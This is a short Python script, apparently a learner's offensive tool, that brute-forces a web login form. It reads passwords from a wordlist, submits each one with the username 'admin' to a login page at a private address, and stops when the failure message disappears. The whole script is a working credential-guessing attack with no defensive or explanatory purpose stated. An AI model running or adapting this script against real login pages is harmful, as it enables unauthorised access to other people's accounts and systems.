#!/usr/bin/env python

import requests

# import the target url and method
target_url = "http://10.0.0.2/login.html"
data_dict = {"username": "admin", "password": "", "Login": "button", "Try Again": ""}

# search response.content for access denied message
access_denied = "Authentication failed!!"

# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open("dic-0294.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Authentication failed!!" in response.content:
            data_dict["Try Again"] = "button"
        elif "Authentication failed!!" not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[+] Reached end of line. Try another wordlist")




# TODO: Create a simple GUI for ease of use